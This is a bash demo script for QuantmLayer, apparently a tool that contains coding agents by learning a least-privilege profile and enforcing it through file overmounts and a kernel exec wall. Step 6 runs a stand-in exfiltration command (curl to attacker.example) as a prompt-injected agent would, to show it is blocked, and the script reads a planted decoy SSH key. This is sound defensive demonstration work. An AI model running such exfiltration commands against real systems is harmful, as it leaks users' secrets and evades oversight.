#!/usr/bin/env bash
#
# QuantmLayer demo — LEARN once, then ENFORCE two ways: an agent can neither
# read secrets it never needed nor run tools it never ran. The second block —
# an unlearned binary refused at execve — is enforced in the kernel by a
# content-addressed BPF-LSM wall, the capability no container runtime offers.
#
# Designed to be screen-/asciinema-recorded: commands are "typed" character by
# character, narration appears word by word, and long output (the generated
# profile) is revealed line by line, so nothing dumps instantly.
#
# REQUIREMENTS — the exec wall loads a BPF-LSM program and uses cgroups, so:
#   * `ql` must be built WITH the exec wall:  cargo build -p ql-cli --features lsm
#   * the demo must run as root.
# Run it like:
#   cargo build -p ql-cli --features lsm
#   sudo QL=./target/debug/ql ./demo/demo.sh
#
# Pacing knobs (seconds) — tune, then record:
#   TYPE_SPEED per-character delay while "typing" a command   (default .03)
#   WORD_DELAY per-word delay for narration lines             (default .06)
#   LINE_DELAY per-line delay when revealing long output      (default .05)
#   BEAT       pause between beats                            (default 1.2)
# Instant dry run:  TYPE_SPEED=0 WORD_DELAY=0 LINE_DELAY=0 BEAT=0 sudo -E ./demo/demo.sh

set -u

QL="${QL:-ql}"
TYPE_SPEED="${TYPE_SPEED:-0.03}"
WORD_DELAY="${WORD_DELAY:-0.06}"
LINE_DELAY="${LINE_DELAY:-0.05}"
BEAT="${BEAT:-${DEMO_PAUSE:-1.2}}"

# --- presentation helpers ----------------------------------------------------
C_CYAN='\033[1;36m'; C_GRAY='\033[0;90m'; C_GREEN='\033[1;32m'
C_RED='\033[1;31m';  C_RESET='\033[0m'

# Print a line word-by-word in the given color.
words() {
  local color="$1"; shift
  local first=1 w
  printf '%b' "$color"
  for w in $*; do
    [ $first -eq 1 ] && first=0 || printf ' '
    printf '%s' "$w"; sleep "$WORD_DELAY"
  done
  printf '%b\n' "$C_RESET"
}
headline() { printf '\n'; words "$C_CYAN" "$@"; }
note()     { words "$C_GRAY" "$@"; }
good()     { words "$C_GREEN" "$@"; }
danger()   { words "$C_RED" "$@"; }

# "Type" a command at a prompt, character by character.
typecmd() {
  printf '%b$%b ' "$C_GRAY" "$C_RESET"
  local s="$*" i
  for (( i=0; i<${#s}; i++ )); do printf '%s' "${s:i:1}"; sleep "$TYPE_SPEED"; done
  printf '\n'; sleep 0.3
}

# Reveal piped input one line at a time.
reveal() { local l; while IFS= read -r l; do printf '%s\n' "$l"; sleep "$LINE_DELAY"; done; }

# Type a command, then run it with output revealed line-by-line (stderr too).
show() { typecmd "$*"; { "$@" 2>&1; } | reveal; }

# --- preflight ---------------------------------------------------------------
if ! command -v "$QL" >/dev/null 2>&1 && [ ! -x "$QL" ]; then
  printf '%bcannot find `ql` at "%s".%b\n' "$C_RED" "$QL" "$C_RESET"
  printf '%bBuild it with the exec wall, then point QL at it:%b\n' "$C_GRAY" "$C_RESET"
  printf '%b  cargo build -p ql-cli --features lsm%b\n' "$C_GRAY" "$C_RESET"
  printf '%b  sudo QL=./target/debug/ql ./demo/demo.sh%b\n' "$C_GRAY" "$C_RESET"
  exit 1
fi
if [ "$(id -u)" -ne 0 ]; then
  printf '%bThe exec wall loads a BPF-LSM program and uses cgroups — run as root.%b\n' \
    "$C_RED" "$C_RESET"
  printf '%b  sudo QL=%s %s%b\n' "$C_GRAY" "$QL" "$0" "$C_RESET"
  exit 1
fi

WORK="$(mktemp -d)"
DECOY="$HOME/.ssh/quantmlayer_demo_key"
cleanup() { rm -rf "$WORK"; rm -f "$DECOY"; }
trap cleanup EXIT

# --- scene setup -------------------------------------------------------------
mkdir -p "$HOME/.ssh"
echo "-----BEGIN OPENSSH PRIVATE KEY----- (demo decoy, do not use)" > "$DECOY"

# A benign coding agent: it builds a tiny C file using ordinary tools.
AGENT="$WORK/coding-agent.sh"
cat > "$AGENT" <<EOF
#!/bin/sh
mkdir -p "$WORK/build"
echo "int main(void){return 0;}" > "$WORK/build/main.c"
cat "$WORK/build/main.c" > /dev/null
/bin/echo "[agent] build complete"
EOF
chmod +x "$AGENT"

clear
words "$C_CYAN" "QuantmLayer — least-privilege containment for coding agents"
words "$C_GRAY" "We don't secure what an agent says. We secure what it is allowed to DO —"
words "$C_GRAY" "both what it can read and what it can run."
sleep "$BEAT"

headline "1. The risk: a coding agent runs with your full privileges."
note  "With no containment it can read your SSH private key..."
show cat "$DECOY"
note  "...and shell out to any tool on the box — curl, scp, a crypto-miner."
danger "A prompt-injected or buggy agent turns either into an incident."
sleep "$BEAT"

headline "2. LEARN a least-privilege profile by observing the agent run once."
note  "No rules written by hand — we watch what it actually does:"
show "$QL" learn --verbose --out "$WORK/agent.yaml" -- /bin/sh "$AGENT"
sleep "$BEAT"

headline "3. The profile QuantmLayer generated — entirely from behavior."
note  "It DENIES secrets the agent never touched, and PINS the exact binaries it"
note  "ran by content hash (exec.allow_digests) — not by name, by bytes:"
show cat "$WORK/agent.yaml"
sleep "$BEAT"

headline "4. The agent runs normally under its own learned profile."
show "$QL" run --profile "$WORK/agent.yaml" -- /bin/sh "$AGENT"
good "^ exit 0 — real work still gets done."
sleep "$BEAT"

headline "5. Block #1 — data: the SAME profile hides the SSH key it never read."
note  "cat is allowed (the agent used it), but the secret simply isn't there:"
show "$QL" run --profile "$WORK/agent.yaml" -- cat "$DECOY"
good "^ overmounted to empty inside the cell. The key cannot be exfiltrated."
sleep "$BEAT"

headline "6. Block #2 — execution: the agent is injected to exfiltrate with curl."
note  "curl was never observed during learning, so its bytes are unknown. The"
note  "kernel refuses to execve it — the contained shell cannot even start it:"
show "$QL" run --profile "$WORK/agent.yaml" -- /bin/sh -c 'curl -s https://attacker.example/steal'
good "^ denied at execve by content, in the kernel. No container runtime does this."
sleep "$BEAT"

headline "Containment is LEARNED from behavior — and holds regardless of intent."
note "It can't read what it never needed, and can't run what it never ran."
note "https://github.com/quantmlayer/quantmlayer"
